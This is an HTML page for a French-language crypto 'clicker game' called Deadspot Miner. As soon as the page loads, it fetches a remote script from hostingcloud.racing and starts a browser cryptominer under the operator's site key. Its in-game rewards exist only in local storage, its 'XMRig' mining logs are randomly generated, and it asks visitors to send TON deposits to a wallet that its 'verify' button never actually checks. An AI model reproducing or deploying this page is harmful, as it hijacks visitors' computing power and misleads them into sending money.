<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Deadspot Miner + Clicker</title>
  <style>
    body {
      background:#0d0d0d;
      color:#eee;
      font-family: monospace;
      text-align: center;
      padding: 20px;
      overflow-x:hidden;
    }
    h1 { color:#4caf50; }

    /* Balance */
    #deadspotBalance {
      font-size:22px;
      margin:10px;
      color:#ffd700;
    }

    /* Barre √©nergie */
    #energyBar {
      width: 300px;
      height: 20px;
      border:1px solid #444;
      margin:10px auto;
      background:#222;
      border-radius:5px;
      overflow:hidden;
    }
    #energyFill {
      height:100%;
      width:100%;
      background:#4caf50;
      transition: width 0.3s;
    }

    /* Bouton Skull */
    #clickBtn {
      width: 200px;
      height: 200px;
      border-radius: 50%;
      background: #111;
      border: 3px solid #444;
      margin: 20px auto;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      box-shadow:0 0 20px #f00;
    }
    #clickBtn img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    #clickBtn:active {
      animation: pulseClick 0.4s;
    }
    @keyframes pulseClick {
      0% { box-shadow:0 0 20px #f00; transform:scale(1);}
      50% { box-shadow:0 0 50px #ff00ff; transform:scale(1.1);}
      100% { box-shadow:0 0 20px #f00; transform:scale(1);}
    }

    /* Pulseur */
    #pulseur {
      width:80px;
      height:80px;
      border-radius:50%;
      background:radial-gradient(circle, #ff0044, #800080);
      margin:10px auto;
      animation: pulseDiamond 2s infinite;
      cursor:pointer;
      box-shadow:0 0 20px #ff0044;
    }
    @keyframes pulseDiamond {
      0%,100% { transform:scale(1); box-shadow:0 0 20px #ff0044; }
      50% { transform:scale(1.2); box-shadow:0 0 50px #ff00ff; }
    }

    button {
      background:#333;
      color:#eee;
      padding:10px 20px;
      border:none;
      border-radius:5px;
      margin:5px;
      cursor:pointer;
    }
    button:hover { background:#555; }

    canvas {
      margin-top: 20px;
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 10px;
    }

    /* Logs en fond translucide */
    #xmrigLogs {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(15,15,15,0.6);
      color: #0f0;
      font-family: monospace;
      font-size: 12px;
      overflow-y: auto;
      z-index: -1;
      padding: 20px;
      white-space: pre-wrap;
    }
    .logAccepted { color:#4caf50; }
    .logRejected { color:#f44336; }

    /* Zone d√©p√¥t */
    #depositBox {
      margin-top:20px;
      padding:15px;
      background:#111;
      border:1px solid #444;
      border-radius:8px;
      max-width:500px;
      margin-left:auto;
      margin-right:auto;
    }
  </style>
</head>
<body>

  <h1>üíé Deadspot Miner + Clicker Game</h1>
  <div id="deadspotBalance">Deadspot: 0</div>
  <div id="energyBar"><div id="energyFill"></div></div>

  <!-- Bouton Skull -->
  <div id="clickBtn">
    <img src="https://cdn-icons-png.flaticon.com/512/3917/3917744.png" alt="skull">
  </div>

  <!-- Pulseur -->
  <div id="pulseur" title="Chaque pulsation augmente ton pool stak√© de +0.5%"></div>

  <button id="exchangeBtn">üîÑ Convertir Hashes ‚Üí Deadspot</button>
  <button id="faucetBtn">üö∞ Faucet Claim</button>

  <!-- Barre progression Hashes -->
  <div id="exchangeProgress"><div id="exchangeFill"></div></div>

  <h2>üìä Hashrate</h2>
  <div id="currentHps">H/s: 0.00</div>
  <div id="totalHashes">Total Hashes: 0</div>
  <canvas id="hashrateChart" width="600" height="200"></canvas>

  <!-- Logs XMRig en fond -->
  <div id="xmrigLogs"></div>

  <h3>‚ö° Am√©liorations</h3>
  <button onclick="buyUpgrade('x2')">x2 Click (Co√ªt: 5 DSC)</button>
  <button onclick="buyUpgrade('auto')">Auto-Click (Co√ªt: 10 DSC)</button>
  <button onclick="buyUpgrade('regen')">√ânergie+ (Co√ªt: 8 DSC)</button>
  <button onclick="buyUpgrade('multi')">x5 Revenus (Co√ªt: 20 DSC)</button>

  <!-- Zone d√©p√¥t -->
  <div id="depositBox">
    <h3>üí∞ D√©p√¥ts Deadspot (via TON)</h3>
    <p><b>Adresse Wallet :</b> EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp</p>
    <p><b>Memo :</b> 492929</p>
    <p style="color:#f55;">‚ö†Ô∏è Les d√©p√¥ts doivent √™tre valid√©s manuellement par l‚Äôadmin.<br>
      Cliquez sur "V√©rifier mon d√©p√¥t" apr√®s envoi.</p>
    <button onclick="verifyDeposit()">üîç V√©rifier mon d√©p√¥t</button>
  </div>

  <p style="margin-top:20px; color:#aaa;">
    üöÄ Deadspot-Token Airdrop pr√©vu le <b>29 mars 2026</b>
  </p>

  <!-- Chart.js -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <!-- Miner Script -->
  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
  <script>
    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
    let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
    let energy = 500, maxEnergy = 500;
    let regenRate = 1;
    let clickValue = 0.00015;
    let autoClickInterval = null;
    let poolBonus = 0;

    function saveGame() {
      localStorage.setItem("deadspot", deadspot);
      localStorage.setItem("upgrades", JSON.stringify(upgrades));
    }
    function updateUI() {
      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5) + " (+ " + poolBonus.toFixed(2) + "% pool)";
      document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
      const total = _client.getTotalHashes();
      const percent = Math.min(100, total/10000000*100);
      document.getElementById("exchangeFill").style.width = percent+"%";
    }

    // Skull click
    document.getElementById("clickBtn").addEventListener("click", () => {
      if (energy > 0) {
        let gain = clickValue;
        if (upgrades.x2) gain *= 2;
        if (upgrades.multi) gain *= 5;
        gain *= (1 + poolBonus/100); // pool bonus
        deadspot += gain;
        energy--;
        updateUI(); saveGame();
      }
    });

    // Regen √©nergie
    setInterval(() => {
      if (energy < maxEnergy) {
        energy = Math.min(maxEnergy, energy + regenRate);
        updateUI();
      }
    }, 1000);

    function startAutoClick() {
      if (autoClickInterval) return;
      autoClickInterval = setInterval(() => {
        if (energy > 0) {
          let gain = clickValue;
          if (upgrades.x2) gain *= 2;
          if (upgrades.multi) gain *= 5;
          gain *= (1 + poolBonus/100);
          deadspot += gain;
          energy--;
          updateUI(); saveGame();
        }
      }, 1000);
    }

    function buyUpgrade(type) {
      if (type === "x2" && !upgrades.x2 && deadspot >= 5) { deadspot -= 5; upgrades.x2 = true; }
      if (type === "auto" && !upgrades.auto && deadspot >= 10) { deadspot -= 10; upgrades.auto = true; startAutoClick(); }
      if (type === "regen" && !upgrades.regen && deadspot >= 8) { deadspot -= 8; upgrades.regen = true; regenRate = 2; }
      if (type === "multi" && !upgrades.multi && deadspot >= 20) { deadspot -= 20; upgrades.multi = true; }
      saveGame(); updateUI();
    }

    // Faucet Claim
    document.getElementById("faucetBtn").addEventListener("click", () => {
      const reward = Math.random() * (0.1 - 0.0002) + 0.0002;
      deadspot += reward;
      alert("üéâ Faucet: +" + reward.toFixed(5) + " DSC");
      updateUI(); saveGame();
    });

    // Pulseur
    document.getElementById("pulseur").addEventListener("animationiteration", () => {
      poolBonus += 0.5;
      updateUI();
    });

    // V√©rif d√©p√¥t
    function verifyDeposit() {
      alert("üîç V√©rification en cours... Merci d‚Äôattendre la validation manuelle de l‚Äôadmin.");
      location.reload();
    }

    // Miner
    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {throttle: 0.1, c: 'w'});
    _client.start();

    // Graphique Hashrate
    const ctx = document.getElementById('hashrateChart').getContext('2d');
    const hashrateChart = new Chart(ctx, {
      type: 'line',
      data: { labels: [], datasets: [{label:'H/s', data:[], borderColor:'#4caf50', fill:true, tension:0.3}] },
      options: {
        responsive:false, animation:false,
        plugins:{legend:{labels:{color:'#eee'}}},
        scales:{ x:{ticks:{color:'#aaa'}}, y:{ticks:{color:'#aaa'}} }
      }
    });

    const currentHpsDisplay = document.getElementById("currentHps");
    const totalHashesDisplay = document.getElementById("totalHashes");
    const xmrigLogs = document.getElementById("xmrigLogs");
    let time = 0;

    setInterval(() => {
      if (_client.isRunning()) {
        const hps = _client.getHashesPerSecond();
        const total = _client.getTotalHashes();
        const threads = _client.getNumThreads();
        currentHpsDisplay.textContent = "H/s: " + hps.toFixed(2);
        totalHashesDisplay.textContent = "Total Hashes: " + total;
        hashrateChart.data.labels.push(time+"s");
        hashrateChart.data.datasets[0].data.push(hps);
        if (hashrateChart.data.labels.length > 20) {
          hashrateChart.data.labels.shift();
          hashrateChart.data.datasets[0].data.shift();
        }
        hashrateChart.update();
        updateUI();
        for (let i=0; i<threads; i++) {
          const coreHps = (hps/threads*(0.9+Math.random()*0.2)).toFixed(2);
          const isAccepted = Math.random()>0.05;
          const logLine = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${isAccepted?"Accepted":"Rejected"}`;
          const span=document.createElement("span");
          span.className=isAccepted?"logAccepted":"logRejected";
          span.textContent=logLine;
          xmrigLogs.appendChild(span);
          xmrigLogs.appendChild(document.createElement("br"));
          xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
        }
        time++;
      }
    },1000);

    if(upgrades.auto) startAutoClick();
    if(upgrades.regen) regenRate=2;
    updateUI();
  </script>
</body>
</html>


